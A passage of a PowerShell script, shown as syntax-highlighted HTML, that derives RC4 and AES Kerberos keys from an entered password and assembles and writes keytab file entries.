class="hljs-built_in">Array</span>]::Reverse(<span class="hljs-variable">$bytes</span>)<br>    &#125;<br>    <span class="hljs-keyword">break</span>;<br>    &#125;<br><span class="hljs-string">&quot;32&quot;</span>&#123;<br>    <span class="hljs-variable">$bytes</span> = [<span class="hljs-type">BitCOnverter</span>]::GetBytes([<span class="hljs-built_in">int</span><span class="hljs-type">32</span>]<span class="hljs-variable">$Value</span>)<br>    <span class="hljs-keyword">if</span>([<span class="hljs-type">BitCOnverter</span>]::IsLittleEndian)&#123;<br>    [<span class="hljs-built_in">Array</span>]::Reverse(<span class="hljs-variable">$bytes</span>)<br>    &#125;<br>    <span class="hljs-keyword">break</span>;<br>     &#125;<br>default&#123;&#125;<br>&#125;<br><br><span class="hljs-keyword">return</span> <span class="hljs-variable">$bytes</span><br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">Get-PrincipalType</span></span> &#123;<br><span class="hljs-keyword">param</span> (<br>[<span class="hljs-type">Parameter</span>(<span class="hljs-type">Mandatory</span>=<span class="hljs-variable">$true</span>)][<span class="hljs-type">ValidateSet</span>(<span class="hljs-string">&quot;KRB5_NT_PRINCIPAL&quot;</span>, <span class="hljs-string">&quot;KRB5_NT_SRV_INST&quot;</span>, <span class="hljs-string">&quot;KRB5_NT_SRV_HST&quot;</span>, <span class="hljs-string">&quot;KRB5_NT_UID&quot;</span>)][<span class="hljs-built_in">String</span>[]]<span class="hljs-variable">$PrincipalType</span><br>)<br><br>[<span class="hljs-built_in">byte</span>[]] <span class="hljs-variable">$nameType</span> = <span class="hljs-selector-tag">@</span>()<br><br><span class="hljs-keyword">switch</span>(<span class="hljs-variable">$PrincipalType</span>)&#123;<br><span class="hljs-string">&quot;KRB5_NT_PRINCIPAL&quot;</span>&#123;<span class="hljs-variable">$nameType</span> = <span class="hljs-selector-tag">@</span>(<span class="hljs-number">00</span>,<span class="hljs-number">00</span>,<span class="hljs-number">00</span>,<span class="hljs-number">01</span>);<span class="hljs-keyword">break</span>&#125;<br><span class="hljs-string">&quot;KRB5_NT_SRV_INST&quot;</span>&#123;<span class="hljs-variable">$nameType</span> = <span class="hljs-selector-tag">@</span>(<span class="hljs-number">00</span>,<span class="hljs-number">00</span>,<span class="hljs-number">00</span>,<span class="hljs-number">02</span>);<span class="hljs-keyword">break</span>&#125;<br><span class="hljs-string">&quot;KRB5_NT_SRV_HST&quot;</span>&#123;<span class="hljs-variable">$nameType</span> = <span class="hljs-selector-tag">@</span>(<span class="hljs-number">00</span>,<span class="hljs-number">00</span>,<span class="hljs-number">00</span>,<span class="hljs-number">03</span>);<span class="hljs-keyword">break</span>&#125;<br><span class="hljs-string">&quot;KRB5_NT_UID&quot;</span>&#123;<span class="hljs-variable">$nameType</span> = <span class="hljs-selector-tag">@</span>(<span class="hljs-number">00</span>,<span class="hljs-number">00</span>,<span class="hljs-number">00</span>,<span class="hljs-number">05</span>);<span class="hljs-keyword">break</span>&#125;<br>default&#123;<span class="hljs-variable">$nameType</span> = <span class="hljs-selector-tag">@</span>(<span class="hljs-number">00</span>,<span class="hljs-number">00</span>,<span class="hljs-number">00</span>,<span class="hljs-number">01</span>);<span class="hljs-keyword">break</span>&#125;<br>&#125;<br><br><span class="hljs-keyword">return</span> <span class="hljs-variable">$nameType</span><br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">Create-KeyTabEntry</span></span> &#123;<br><span class="hljs-keyword">param</span> (<br>[<span class="hljs-type">Parameter</span>(<span class="hljs-type">Mandatory</span>=<span class="hljs-variable">$true</span>)]<span class="hljs-variable">$PasswordString</span>,<br>[<span class="hljs-type">Parameter</span>(<span class="hljs-type">Mandatory</span>=<span class="hljs-variable">$true</span>)]<span class="hljs-variable">$RealmString</span>,<br>[<span class="hljs-type">Parameter</span>(<span class="hljs-type">Mandatory</span>=<span class="hljs-variable">$true</span>)]<span class="hljs-variable">$Components</span>,<br>[<span class="hljs-type">Parameter</span>(<span class="hljs-type">Mandatory</span>=<span class="hljs-variable">$false</span>)]<span class="hljs-variable">$SALT</span>=<span class="hljs-string">&quot;&quot;</span>,<br>[<span class="hljs-type">Parameter</span>(<span class="hljs-type">Mandatory</span>=<span class="hljs-variable">$false</span>)]<span class="hljs-variable">$KVNO</span>=<span class="hljs-number">1</span>,<br>[<span class="hljs-type">Parameter</span>(<span class="hljs-type">Mandatory</span>=<span class="hljs-variable">$true</span>)][<span class="hljs-type">ValidateSet</span>(<span class="hljs-string">&quot;KRB5_NT_PRINCIPAL&quot;</span>, <span class="hljs-string">&quot;KRB5_NT_SRV_INST&quot;</span>, <span class="hljs-string">&quot;KRB5_NT_SRV_HST&quot;</span>, <span class="hljs-string">&quot;KRB5_NT_UID&quot;</span>)][<span class="hljs-built_in">String</span>[]]<span class="hljs-variable">$PrincipalType</span>,<br>[<span class="hljs-type">Parameter</span>(<span class="hljs-type">Mandatory</span>=<span class="hljs-variable">$true</span>)][<span class="hljs-type">ValidateSet</span>(<span class="hljs-string">&quot;RC4&quot;</span>, <span class="hljs-string">&quot;AES128&quot;</span>, <span class="hljs-string">&quot;AES256&quot;</span>)][<span class="hljs-built_in">String</span>[]]<span class="hljs-variable">$EncryptionKeyType</span><br>)<br><br><span class="hljs-comment">### Key Types: RC4 0x17 (23), AES128  0x11 (17), AES256  0x12 (18)</span><br><br><span class="hljs-comment">### Set Key Type</span><br>[<span class="hljs-built_in">byte</span>[]] <span class="hljs-variable">$keyType</span> = <span class="hljs-selector-tag">@</span>()<br>[<span class="hljs-built_in">byte</span>[]] <span class="hljs-variable">$sizeKeyBlock</span> = <span class="hljs-selector-tag">@</span>()<br><br><span class="hljs-keyword">switch</span>(<span class="hljs-variable">$EncryptionKeyType</span>)&#123;<br><span class="hljs-string">&quot;RC4&quot;</span>&#123;<br>       <span class="hljs-variable">$keyType</span> = <span class="hljs-selector-tag">@</span>(<span class="hljs-number">00</span>,<span class="hljs-number">23</span>)<br>       <span class="hljs-variable">$sizeKey</span> = <span class="hljs-number">16</span><br>       <span class="hljs-variable">$sizeKeyBlock</span> = <span class="hljs-selector-tag">@</span>(<span class="hljs-number">00</span>,<span class="hljs-number">16</span>)<br>       <span class="hljs-comment">### Create RC4-HMAC Key. Unicode is required for MD4 hash input.</span><br>       [<span class="hljs-built_in">byte</span>[]]<span class="hljs-variable">$password</span> = [<span class="hljs-type">Text.Encoding</span>]::Unicode.GetBytes(<span class="hljs-variable">$passwordString</span>)<br>       <span class="hljs-variable">$keyBlock</span> = <span class="hljs-built_in">Get-MD4</span> <span class="hljs-literal">-bArray</span> <span class="hljs-variable">$password</span> <span class="hljs-literal">-UpperCase</span><br>       <span class="hljs-keyword">break</span><br>       &#125;<br><span class="hljs-string">&quot;AES128&quot;</span>&#123;<br>        <span class="hljs-variable">$keyType</span> = <span class="hljs-selector-tag">@</span>(<span class="hljs-number">00</span>,<span class="hljs-number">17</span>)<br>        <span class="hljs-variable">$sizeKey</span> = <span class="hljs-number">16</span><br>        <span class="hljs-variable">$sizeKeyBlock</span> = <span class="hljs-selector-tag">@</span>(<span class="hljs-number">00</span>,<span class="hljs-number">16</span>)<br>        <span class="hljs-comment">#$keyBlock = Get-AES128Key -PasswordString $passwordString -Realm $RealmString -Principal $PrincipalString -SALT $SALT</span><br>        <span class="hljs-variable">$keyBlock</span> = <span class="hljs-built_in">Get-AES128Key</span> <span class="hljs-literal">-PasswordString</span> <span class="hljs-variable">$passwordString</span> <span class="hljs-literal">-SALT</span> <span class="hljs-variable">$SALT</span><br>        <span class="hljs-keyword">break</span><br>        &#125;<br><span class="hljs-string">&quot;AES256&quot;</span>&#123;<br>        <span class="hljs-variable">$keyType</span> = <span class="hljs-selector-tag">@</span>(<span class="hljs-number">00</span>,<span class="hljs-number">18</span>)<br>        <span class="hljs-variable">$sizeKey</span> = <span class="hljs-number">32</span><br>        <span class="hljs-variable">$sizeKeyBlock</span> = <span class="hljs-selector-tag">@</span>(<span class="hljs-number">00</span>,<span class="hljs-number">32</span>)<br>        <span class="hljs-comment">#$keyBlock = Get-AES256Key -PasswordString $passwordString -Realm $RealmString -Principal $PrincipalString -SALT $SALT</span><br>        <span class="hljs-variable">$keyBlock</span> = <span class="hljs-built_in">Get-AES256Key</span> <span class="hljs-literal">-PasswordString</span> <span class="hljs-variable">$passwordString</span> <span class="hljs-literal">-SALT</span> <span class="hljs-variable">$SALT</span><br>        <span class="hljs-keyword">break</span><br>        &#125;<br>default&#123;&#125;<br>&#125;<br><br><span class="hljs-comment">### Set Principal Type</span><br>[<span class="hljs-built_in">byte</span>[]] <span class="hljs-variable">$nameType</span> = <span class="hljs-selector-tag">@</span>()<br><span class="hljs-keyword">switch</span>(<span class="hljs-variable">$PrincipalType</span>)&#123;<br><span class="hljs-string">&quot;KRB5_NT_PRINCIPAL&quot;</span>&#123;<span class="hljs-variable">$nameType</span> = <span class="hljs-selector-tag">@</span>(<span class="hljs-number">00</span>,<span class="hljs-number">00</span>,<span class="hljs-number">00</span>,<span class="hljs-number">01</span>);<span class="hljs-keyword">break</span>&#125;<br><span class="hljs-string">&quot;KRB5_NT_SRV_INST&quot;</span>&#123;<span class="hljs-variable">$nameType</span> = <span class="hljs-selector-tag">@</span>(<span class="hljs-number">00</span>,<span class="hljs-number">00</span>,<span class="hljs-number">00</span>,<span class="hljs-number">02</span>);<span class="hljs-keyword">break</span>&#125;<br><span class="hljs-string">&quot;KRB5_NT_SRV_HST&quot;</span>&#123;<span class="hljs-variable">$nameType</span> = <span class="hljs-selector-tag">@</span>(<span class="hljs-number">00</span>,<span class="hljs-number">00</span>,<span class="hljs-number">00</span>,<span class="hljs-number">03</span>);<span class="hljs-keyword">break</span>&#125;<br><span class="hljs-string">&quot;KRB5_NT_UID&quot;</span>&#123;<span class="hljs-variable">$nameType</span> = <span class="hljs-selector-tag">@</span>(<span class="hljs-number">00</span>,<span class="hljs-number">00</span>,<span class="hljs-number">00</span>,<span class="hljs-number">05</span>);<span class="hljs-keyword">break</span>&#125;<br>default&#123;<span class="hljs-variable">$nameType</span> = <span class="hljs-selector-tag">@</span>(<span class="hljs-number">00</span>,<span class="hljs-number">00</span>,<span class="hljs-number">00</span>,<span class="hljs-number">01</span>);<span class="hljs-keyword">break</span>&#125;<br>&#125;<br><br><span class="hljs-comment">### KVNO larger than 255 requires 32bit KVNO field at the end of the record</span><br><span class="hljs-variable">$vno</span> = <span class="hljs-selector-tag">@</span>()<br><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$kvno</span> <span class="hljs-operator">-le</span> <span class="hljs-number">255</span>)&#123;<br><span class="hljs-variable">$vno</span> = <span class="hljs-selector-tag">@</span>([<span class="hljs-built_in">byte</span>]<span class="hljs-variable">$kvno</span>)<br>&#125; <span class="hljs-keyword">else</span> &#123;<br><span class="hljs-variable">$vno</span> = <span class="hljs-selector-tag">@</span>(<span class="hljs-number">00</span>)<br>&#125;<br><br>[<span class="hljs-built_in">byte</span>[]]<span class="hljs-variable">$numComponents</span> = <span class="hljs-built_in">Get-BytesBigEndian</span> <span class="hljs-literal">-BitSize</span> <span class="hljs-number">16</span> <span class="hljs-literal">-Value</span> <span class="hljs-variable">$components</span>.Count<br><br><span class="hljs-comment">### To Set TimeStamp To Jan 1, 1970 - [byte[]]$timeStamp = @(0,0,0,0)</span><br><span class="hljs-comment">### [byte[]]$timeStamp = Get-BytesBigEndian -BitSize 32 -Value ([int]([Math]::Truncate((Get-Date(Get-Date).ToUniversalTime() -UFormat %s))))</span><br><span class="hljs-comment">### 15 September 2020 Updated</span><br><span class="hljs-comment">### https://github.com/matherm-aboehm suggested use of [decimal]::Parse to fix timestamp error on localized versions of Windows.</span><br>[<span class="hljs-built_in">byte</span>[]]<span class="hljs-variable">$timeStamp</span> = <span class="hljs-built_in">Get-BytesBigEndian</span> <span class="hljs-literal">-BitSize</span> <span class="hljs-number">32</span> <span class="hljs-literal">-Value</span> ([<span class="hljs-built_in">int</span>]([<span class="hljs-type">Math</span>]::Truncate([<span class="hljs-built_in">decimal</span>]::Parse((<span class="hljs-built_in">Get-Date</span>(<span class="hljs-built_in">Get-Date</span>).ToUniversalTime() <span class="hljs-literal">-UFormat</span> %s)))))<br><br><span class="hljs-comment">### Data size information for KeyEntry</span><br><span class="hljs-comment"># num_components bytes   = 2</span><br><span class="hljs-comment"># realm bytes            = variable (2 bytes) + length</span><br><span class="hljs-comment"># components array bytes = varable (2 bytes) + length for each component. Component count should be typically 1 or 2.</span><br><span class="hljs-comment"># name type bytes        = 4</span><br><span class="hljs-comment"># timestamp bytes        = 4</span><br><span class="hljs-comment"># kvno bytes             = 1 or 4</span><br><span class="hljs-comment"># Key Type bytes         = 2</span><br><span class="hljs-comment"># Key bytes              = 2 + 16 or 32 &quot;RC4 and AES128 are 16 Byte Keys. AES 256 is 32&quot;</span><br><br><span class="hljs-variable">$sizeRealm</span>  = <span class="hljs-built_in">Get-BytesBigEndian</span> <span class="hljs-literal">-Value</span> ([<span class="hljs-type">Text.Encoding</span>]::UTF8.GetByteCount(<span class="hljs-variable">$realmString</span>)) <span class="hljs-literal">-BitSize</span> <span class="hljs-number">16</span><br>[<span class="hljs-built_in">Int</span><span class="hljs-type">32</span>]<span class="hljs-variable">$sizeKeyTabEntry</span> = <span class="hljs-number">2</span> <span class="hljs-comment">#NumComponentsSize</span><br><span class="hljs-variable">$sizeKeyTabEntry</span> += <span class="hljs-number">2</span> <span class="hljs-comment">#RealmLength Byte Count </span><br><span class="hljs-variable">$sizeKeyTabEntry</span> += ([<span class="hljs-type">Text.Encoding</span>]::UTF8.GetByteCount(<span class="hljs-variable">$realmString</span>))<br>    <span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$principal</span> <span class="hljs-keyword">in</span> <span class="hljs-variable">$Components</span>)&#123;<br>    <span class="hljs-variable">$sizePrincipal</span> = ([<span class="hljs-type">Text.Encoding</span>]::UTF8.GetByteCount(<span class="hljs-variable">$principal</span>))<br>    <span class="hljs-variable">$sizeKeyTabEntry</span> += <span class="hljs-variable">$sizePrincipal</span> + <span class="hljs-number">2</span><br>    &#125;<br><span class="hljs-variable">$sizeKeyTabEntry</span> += <span class="hljs-number">4</span> <span class="hljs-comment">#NameType</span><br><span class="hljs-variable">$sizeKeyTabEntry</span> += <span class="hljs-number">4</span> <span class="hljs-comment">#TimeStamp</span><br><span class="hljs-variable">$sizeKeyTabEntry</span> += <span class="hljs-number">1</span> <span class="hljs-comment">#KVNO 8bit</span><br><span class="hljs-variable">$sizeKeyTabEntry</span> += <span class="hljs-number">2</span> <span class="hljs-comment">#KeyType</span><br><span class="hljs-variable">$sizeKeyTabEntry</span> += <span class="hljs-number">2</span> <span class="hljs-comment">#Key Length Count</span><br><span class="hljs-variable">$sizeKeyTabEntry</span> += <span class="hljs-variable">$sizeKey</span><br><br><span class="hljs-variable">$sizeTotal</span> = <span class="hljs-built_in">Get-BytesBigEndian</span> <span class="hljs-literal">-Value</span> <span class="hljs-variable">$sizeKeyTabEntry</span> <span class="hljs-literal">-BitSize</span> <span class="hljs-number">32</span><br><br>[<span class="hljs-built_in">byte</span>[]] <span class="hljs-variable">$keytabEntry</span> = <span class="hljs-selector-tag">@</span>()<br><span class="hljs-variable">$keytabEntry</span> += <span class="hljs-variable">$sizeTotal</span><br><span class="hljs-variable">$keytabEntry</span> += <span class="hljs-variable">$numComponents</span><br><span class="hljs-variable">$keytabEntry</span> += <span class="hljs-variable">$sizeRealm</span><br><span class="hljs-variable">$keytabEntry</span> += [<span class="hljs-built_in">byte</span>[]][<span class="hljs-type">Text.Encoding</span>]::UTF8.GetBytes(<span class="hljs-variable">$realmString</span>)<br>    <span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$principal</span> <span class="hljs-keyword">in</span> <span class="hljs-variable">$Components</span>)&#123;<br>    <span class="hljs-variable">$sizePrincipal</span> = <span class="hljs-built_in">Get-BytesBigEndian</span> <span class="hljs-literal">-Value</span> ([<span class="hljs-type">Text.Encoding</span>]::UTF8.GetByteCount(<span class="hljs-variable">$principal</span>)) <span class="hljs-literal">-BitSize</span> <span class="hljs-number">16</span><br>    <span class="hljs-variable">$keytabEntry</span> += <span class="hljs-variable">$sizePrincipal</span><br>    <span class="hljs-variable">$keytabEntry</span> += [<span class="hljs-built_in">byte</span>[]][<span class="hljs-type">Text.Encoding</span>]::UTF8.GetBytes(<span class="hljs-variable">$principal</span>)<br>    &#125;<br><span class="hljs-variable">$keytabEntry</span> += <span class="hljs-variable">$nameType</span><br><span class="hljs-variable">$keytabEntry</span> += <span class="hljs-variable">$timeStamp</span><br><span class="hljs-variable">$keytabEntry</span> += <span class="hljs-variable">$vno</span><br><span class="hljs-variable">$keytabEntry</span> += <span class="hljs-variable">$keyType</span><br><span class="hljs-variable">$keytabEntry</span> += <span class="hljs-variable">$sizeKeyBlock</span><br><span class="hljs-variable">$keytabEntry</span> += <span class="hljs-built_in">Get-ByteArrayFromHexString</span> <span class="hljs-literal">-HexString</span> <span class="hljs-variable">$keyBlock</span><br><br><span class="hljs-variable">$keytabEntryObject</span> = [<span class="hljs-type">PsCustomObject</span>]<span class="hljs-selector-tag">@</span>&#123;<br>        Size           = <span class="hljs-variable">$sizeKeyTabEntry</span><br>        NumComponents  = <span class="hljs-variable">$numComponents</span><br>        Realm          = [<span class="hljs-built_in">byte</span>[]][<span class="hljs-type">Text.Encoding</span>]::UTF8.GetBytes(<span class="hljs-variable">$realmString</span>)<br>        Components     = <span class="hljs-variable">$components</span><br>        NameType       = <span class="hljs-variable">$nameType</span><br>        TimeStamp      = <span class="hljs-variable">$timeStamp</span><br>        KeyType        = <span class="hljs-variable">$keyType</span><br>        KeyBlock       = <span class="hljs-variable">$keyBlock</span><br>        KeytabEntry    = <span class="hljs-variable">$keytabEntry</span><br>    &#125;<br><span class="hljs-keyword">return</span> <span class="hljs-variable">$keytabEntryObject</span><br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">Function</span> <span class="hljs-title">Get-Password</span></span> &#123;<br><br>        <span class="hljs-variable">$passwordSecure</span> = <span class="hljs-built_in">Read-Host</span> <span class="hljs-literal">-Prompt</span> <span class="hljs-string">&quot;Enter Password&quot;</span> <span class="hljs-literal">-AsSecureString</span><br>        <span class="hljs-variable">$passwordBSTR</span> = [<span class="hljs-type">System.Runtime.InteropServices.Marshal</span>]::SecureStringToBSTR(<span class="hljs-variable">$passwordSecure</span>)<br>        <span class="hljs-variable">$password</span> = [<span class="hljs-type">System.Runtime.InteropServices.Marshal</span>]::PtrToStringAuto(<span class="hljs-variable">$passwordBSTR</span>)<br><br><br><span class="hljs-keyword">return</span> <span class="hljs-variable">$password</span><br>&#125;<br><br><br><span class="hljs-keyword">if</span> ([<span class="hljs-built_in">string</span>]::IsNullOrEmpty(<span class="hljs-variable">$Password</span>))&#123;<span class="hljs-variable">$Password</span> = <span class="hljs-variable">$</span>(<span class="hljs-built_in">Get-Password</span>)&#125;<br><br><span class="hljs-keyword">if</span> ([<span class="hljs-built_in">string</span>]::IsNullOrEmpty(<span class="hljs-variable">$File</span>))&#123;<span class="hljs-variable">$File</span>=<span class="hljs-variable">$</span>(<span class="hljs-built_in">Get-Location</span>).Path+<span class="hljs-string">&#x27;\login.keytab&#x27;</span>&#125;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$Quiet</span>) &#123;<br><span class="hljs-variable">$Script:Silent</span> = <span class="hljs-variable">$true</span><br>&#125; <span class="hljs-keyword">else</span> &#123;<br><span class="hljs-variable">$Script:Silent</span> = <span class="hljs-variable">$false</span><br>&#125;<br><br><span class="hljs-comment">### Force Realm to UPPERCASE</span><br><span class="hljs-variable">$Realm</span> = <span class="hljs-variable">$Realm</span>.ToUpper()<br><br><span class="hljs-comment">### The Components array splits the primary/principal.</span><br><span class="hljs-variable">$PrincipalArray</span> = <span class="hljs-selector-tag">@</span>()<br><span class="hljs-variable">$PrincipalArray</span> = <span class="hljs-variable">$Principal</span>.Split(<span class="hljs-string">&#x27;,&#x27;</span>)<br><span class="hljs-comment">### Check For Custom SALT</span><br><span class="hljs-keyword">if</span>([<span class="hljs-built_in">string</span>]::IsNullOrEmpty(<span class="hljs-variable">$SALT</span>) <span class="hljs-operator">-eq</span> <span class="hljs-variable">$true</span>) &#123;<br><span class="hljs-variable">$SALT</span> = <span class="hljs-variable">$Realm</span><br><span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span>=<span class="hljs-number">0</span>;<span class="hljs-variable">$i</span> <span class="hljs-operator">-lt</span> <span class="hljs-variable">$PrincipalArray</span>.Count;<span class="hljs-variable">$i</span>++)&#123;<br><span class="hljs-variable">$SALT</span> += <span class="hljs-variable">$</span>(<span class="hljs-variable">$PrincipalArray</span>[<span class="hljs-variable">$i</span>].Replace(<span class="hljs-string">&#x27;/&#x27;</span>,<span class="hljs-string">&quot;&quot;</span>))<br>&#125;<br><br>&#125;<br><span class="hljs-comment">### Finish spliting principal into component parts. PrincipalArray should have at most 2 elements. Testing with Java based tools, </span><br><span class="hljs-comment">### the keytab entry can only support one UPN. The components portion of the keytab entry appears to only be for spliting</span><br><span class="hljs-comment">### a UPN in an SPN format. e.g. HOST/user@dev.home</span><br><span class="hljs-variable">$PrincipalText</span> = <span class="hljs-variable">$Principal</span><br><span class="hljs-variable">$Principal</span> = <span class="hljs-variable">$Principal</span>.Replace(<span class="hljs-string">&#x27;/&#x27;</span>,<span class="hljs-string">&quot;,&quot;</span>)<br><span class="hljs-variable">$PrincipalArray</span> = <span class="hljs-selector-tag">@</span>()<br><span class="hljs-variable">$PrincipalArray</span> = <span class="hljs-variable">$Principal</span>.Split(<span class="hljs-string">&#x27;,&#x27;</span>)<br><br>[<span class="hljs-built_in">byte</span>[]] <span class="hljs-variable">$keyTabVersion</span> = <span class="hljs-selector-tag">@</span>(<span class="hljs-number">05</span>,<span class="hljs-number">02</span>)<br>[<span class="hljs-built_in">byte</span>[]] <span class="hljs-variable">$keyTabEntries</span> = <span class="hljs-selector-tag">@</span>()<br><br><span class="hljs-comment">### Set Default Encryption to AES256 if none of the E-Type switches are set</span><br><span class="hljs-keyword">if</span>(!<span class="hljs-variable">$RC4</span> <span class="hljs-operator">-and</span> !<span class="hljs-variable">$AES128</span> <span class="hljs-operator">-and</span> !<span class="hljs-variable">$AES256</span>)&#123;<br><span class="hljs-variable">$AES256</span> = <span class="hljs-variable">$true</span><br>&#125;<br><br><span class="hljs-comment">### Truncate KVNO</span><br>[<span class="hljs-built_in">Byte</span>[]] <span class="hljs-variable">$KVNO</span> = [<span class="hljs-built_in">Byte</span>[]](<span class="hljs-built_in">Get-BytesBigEndian</span> <span class="hljs-literal">-BitSize</span> <span class="hljs-number">32</span> <span class="hljs-literal">-Value</span> <span class="hljs-variable">$KVNO</span>)<br>[<span class="hljs-built_in">int</span><span class="hljs-type">16</span>] <span class="hljs-variable">$KVNO</span> = [<span class="hljs-built_in">int</span>]<span class="hljs-variable">$KVNO</span>[<span class="hljs-number">3</span>]<br><br><span class="hljs-comment">### Create KeyTab Entries for selected E-Types RC4/AES128/AES256 supported</span><br><span class="hljs-variable">$keytabEntry</span> = <span class="hljs-variable">$null</span><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$RC4</span> <span class="hljs-operator">-eq</span> <span class="hljs-variable">$true</span>)&#123;<br><span class="hljs-variable">$keytabEntry</span> = Create<span class="hljs-literal">-KeyTabEntry</span> `<br><span class="hljs-literal">-realmString</span> <span class="hljs-variable">$Realm</span> <span class="hljs-literal">-Components</span> <span class="hljs-variable">$PrincipalArray</span> <span class="hljs-literal">-passwordString</span> <span class="hljs-variable">$Password</span> `<br><span class="hljs-literal">-PrincipalType</span> <span class="hljs-variable">$PType</span> <span class="hljs-literal">-EncryptionKeyType</span> RC4 <span class="hljs-literal">-KVNO</span> <span class="hljs-variable">$KVNO</span><br><span class="hljs-variable">$keyTabEntries</span> += <span class="hljs-variable">$keytabEntry</span>.KeytabEntry<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$Script:Silent</span> <span class="hljs-operator">-eq</span> <span class="hljs-variable">$false</span>)&#123; <span class="hljs-built_in">Write-Host</span> <span class="hljs-string">&quot;RC4:&quot;</span><span class="hljs-variable">$keytabEntry</span>.KeyBlock <span class="hljs-literal">-ForegroundColor</span> Cyan&#125;<br>&#125;<br><span class="hljs-variable">$keytabEntry</span> = <span class="hljs-variable">$null</span><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$AES128</span> <span class="hljs-operator">-eq</span> <span class="hljs-variable">$true</span>)&#123;<br><span class="hljs-variable">$keytabEntry</span> = Create<span class="hljs-literal">-KeyTabEntry</span> `<br><span class="hljs-literal">-realmString</span> <span class="hljs-variable">$Realm</span> <span class="hljs-literal">-Components</span> <span class="hljs-variable">$PrincipalArray</span> <span class="hljs-literal">-passwordString</span> <span class="hljs-variable">$Password</span> `<br><span class="hljs-literal">-PrincipalType</span> <span class="hljs-variable">$PType</span> <span class="hljs-literal">-EncryptionKeyType</span> AES128 <span class="hljs-literal">-KVNO</span> <span class="hljs-variable">$KVNO</span> <span class="hljs-literal">-SALT</span> <span class="hljs-variable">$SALT</span><br><span class="hljs-variable">$keyTabEntries</span> += <span class="hljs-variable">$keytabEntry</span>.KeytabEntry<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$Script:Silent</span> <span class="hljs-operator">-eq</span> <span class="hljs-variable">$false</span>)&#123; <span class="hljs-built_in">Write-Host</span> <span class="hljs-string">&quot;AES128:&quot;</span><span class="hljs-variable">$keytabEntry</span>.KeyBlock <span class="hljs-literal">-ForegroundColor</span> Cyan&#125;<br>&#125;<br><span class="hljs-variable">$keytabEntry</span> = <span class="hljs-variable">$null</span><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$AES256</span> <span class="hljs-operator">-eq</span> <span class="hljs-variable">$true</span>)&#123;<br><span class="hljs-variable">$keytabEntry</span> = Create<span class="hljs-literal">-KeyTabEntry</span> `<br><span class="hljs-literal">-realmString</span> <span class="hljs-variable">$Realm</span> <span class="hljs-literal">-Components</span> <span class="hljs-variable">$PrincipalArray</span> <span class="hljs-literal">-passwordString</span> <span class="hljs-variable">$Password</span> `<br><span class="hljs-literal">-PrincipalType</span> <span class="hljs-variable">$PType</span> <span class="hljs-literal">-EncryptionKeyType</span> AES256 <span class="hljs-literal">-KVNO</span> <span class="hljs-variable">$KVNO</span> <span class="hljs-literal">-SALT</span> <span class="hljs-variable">$SALT</span><br><span class="hljs-variable">$keyTabEntries</span> += <span class="hljs-variable">$keytabEntry</span>.KeytabEntry<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$Script:Silent</span> <span class="hljs-operator">-eq</span> <span class="hljs-variable">$false</span>)&#123; <span class="hljs-built_in">Write-Host</span> <span class="hljs-string">&quot;AES256:&quot;</span><span class="hljs-variable">$keytabEntry</span>.KeyBlock <span class="hljs-literal">-ForegroundColor</span> Cyan&#125;<br>&#125;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$Script:Silent</span> <span class="hljs-operator">-eq</span> <span class="hljs-variable">$false</span>)&#123;<br><span class="hljs-built_in">Write-Host</span> <span class="hljs-variable">$</span>(<span class="hljs-string">&quot;Principal Type:&quot;</span>).PadLeft(<span class="hljs-number">15</span>)<span class="hljs-variable">$PType</span> <span class="hljs-literal">-ForegroundColor</span> Green<br><span class="hljs-built_in">Write-Host</span> <span class="hljs-variable">$</span>(<span class="hljs-string">&quot;Realm:&quot;</span>).PadLeft(<span class="hljs-number">15</span>)<span class="hljs-variable">$Realm</span> <span class="hljs-literal">-ForegroundColor</span> Green<br><span class="hljs-built_in">Write-Host</span> <span class="hljs-variable">$</span>(<span class="hljs-string">&quot;User Name:&quot;</span>).PadLeft(<span class="hljs-number">15</span>)<span class="hljs-variable">$PrincipalText</span> <span class="hljs-literal">-ForegroundColor</span> Green<br><span class="hljs-built_in">Write-Host</span> <span class="hljs-variable">$</span>(<span class="hljs-string">&quot;SALT:&quot;</span>).PadLeft(<span class="hljs-number">15</span>)<span class="hljs-variable">$SALT</span> <span class="hljs-literal">-ForegroundColor</span> Green<br><span class="hljs-built_in">Write-Host</span> <span class="hljs-variable">$</span>(<span class="hljs-string">&quot;Keytab File:&quot;</span>).PadLeft(<span class="hljs-number">15</span>)<span class="hljs-variable">$File</span> <span class="hljs-literal">-ForegroundColor</span> Green<br><span class="hljs-built_in">Write-Host</span> <span class="hljs-variable">$</span>(<span class="hljs-string">&quot;Append File:&quot;</span>).PadLeft(<span class="hljs-number">15</span>)<span class="hljs-variable">$Append</span> <span class="hljs-literal">-ForegroundColor</span> Green<br><span class="hljs-built_in">Write-Host</span> <span class="hljs-string">&quot;&quot;</span><br>&#125;<br><br><span class="hljs-keyword">if</span>(!<span class="hljs-variable">$NoPrompt</span>)&#123;<br><span class="hljs-built_in">Write-Host</span> <span class="hljs-string">&quot;Press Enter to Write KeyTab File /Ctrl+C to quit...&quot;</span> <span class="hljs-literal">-ForegroundColor</span> Yellow <span class="hljs-literal">-NoNewline</span><br>[<span class="hljs-built_in">void</span>](<span class="hljs-built_in">Read-Host</span>)<br><span class="hljs-built_in">Write-Host</span> <span class="hljs-string">&quot;&quot;</span><br>&#125;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$Append</span> <span class="hljs-operator">-eq</span> <span class="hljs-variable">$true</span>)&#123;<br><span class="hljs-variable">$fileBytes</span> = <span class="hljs-selector-tag">@</span>()<br>    <span class="hljs-keyword">if</span>([<span class="hljs-type">System.IO.File</span>]::Exists(<span class="hljs-variable">$File</span>))&#123;<br>    <span class="hljs-variable">$fileBytes</span> += [<span class="hljs-type">System.IO.File</span>]::ReadAllBytes(<span 